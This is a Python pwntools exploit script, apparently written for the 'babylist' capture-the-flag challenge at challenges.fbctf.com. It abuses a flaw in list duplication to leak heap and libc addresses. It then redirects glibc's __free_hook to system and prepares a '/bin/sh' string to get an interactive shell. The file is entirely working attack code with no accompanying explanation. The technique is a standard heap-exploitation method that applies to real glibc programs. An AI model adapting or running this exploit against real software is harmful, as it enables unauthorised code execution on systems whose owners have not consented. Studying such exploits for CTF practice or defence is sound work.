from pwn import *
import sys
import time

OPTIONS = {
        'binary' : './babylist',
        'server' : 'challenges.fbctf.com',
        'port' : 1343,
        'libc': None
}

def s32(num):
	return signed_int(num)


def us32(num):
	return unsigned_int(num)


def s64(num):
	return signed_int(num, bits=64)

def us64(num):
	return unsigned_int(num, bits=64)


def signed_int(num, bits=32):
	ovflow = 1 << (bits)
	allBits = ovflow - 1

	lastBitSet = 1 << (bits - 1)

	num &= allBits

	if num&lastBitSet != 0:
		return - (ovflow - num)
	return num

def unsigned_int(num, bits=32):
	allBits = (1 << (bits)) - 1
	return num&allBits

def rc():
    r.recvuntil('> ')

def create_list(name):
    r.sendline('1')
    r.sendlineafter(':\n', name)
    rc()

def add_element(list_index, element_val):
    r.sendline('2')
    r.sendlineafter(':\n', str(list_index))
    r.sendlineafter(':\n', str(s32(element_val)))
    rc()

def view_element(list_index, element_index):
    r.sendline('3')
    r.sendlineafter(':\n', str(list_index))
    r.sendlineafter(':\n', str(element_index))
    listname = r.recvuntil(' = ')
    val = us32(int(r.recvline()))
    rc()
    return listname, val

def dup_list(list_index, new_name):
    r.sendline('4')
    r.sendlineafter(':\n', str(list_index))
    r.sendlineafter(':\n', new_name)
    rc()

def remove_list(list_index):
    r.sendline('5')
    r.sendlineafter(':\n', str(list_index))
    rc()

    

def exploit(r):
    rc()

    create_list("A"*0x10) #0
    add_element(0, 0xdeadbeef)
    add_element(0, 0xdeadbeef)
    add_element(0, 0xdeadbeef)

    dup_list(0, "B"*0x10) #1

    add_element(0, 0xdeadbeef)
    add_element(0, 0xdeadbeef)
    #List 1's first element now points to FD 

    heap_leak = view_element(1, 0)[1] + (view_element(1, 1)[1] << 32)
    
    log.info("Heap leak -> 0x{:x}".format(heap_leak))

    for m in range((0x800/0x4)-5):
        print m
        add_element(0, 0xdeadbeef)

    dup_list(0, "C"*0x10) #2

    add_element(0, 0xdeadbeef)
    add_element(0, 0xdeadbeef)

    libc_leak = view_element(2, 0)[1] + (view_element(2, 1)[1] << 32)

    log.info("Libc_leak -> 0x{:x}".format(libc_leak))

    libc.address = libc_leak - 0x3ebca0

    # create_list("D"*0x10) #3

    # add_element(3, 0xfeedface)
    # add_element(3, 0xfeedface)

    # dup_list(3, "E"*0x10)

    create_list("HAX") #3

    for m in range(0x20/4):
        add_element(3, 0xfeedface)

    dup_list(3, "HAX2") #4

    add_element(3, 0xfeedface)
    add_element(4, 0xfeedface)

    create_list("SICE") #5
    add_element(5, libc.symbols['__free_hook']&0xffffffff)
    add_element(5, libc.symbols['__free_hook']>>32)

    for m in range((0x20/4)-2):
        add_element(5, 0xfeedface)

    create_list("SICE")#6
    add_element(6, int('/bin'[::-1].encode("hex"), 16))
    add_element(6, int('/sh'[::-1].encode("hex"), 16))
    for m in range((0x20/4)-2):
        add_element(6, 0xfeedface)

    create_list("Final_sice") #7
    add_element(7, libc.symbols['system']&0xffffffff)
    add_element(7, libc.symbols['system']>>32)

    for m in range((0x20/4)-2):
        add_element(7, 0xfeedface)




    r.interactive()


if __name__ == "__main__":
        binary = ELF(OPTIONS['binary'], checksec=False)
        if OPTIONS['libc'] != None:
                libc = ELF(OPTIONS['libc'], checksec=False)     
        else:
                libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
        if args['REMOTE'] == '1':
                r = remote(OPTIONS['server'], OPTIONS['port'])
                exploit(r)
        else:
                r = process(OPTIONS['binary'])
                pause()
                exploit(r)
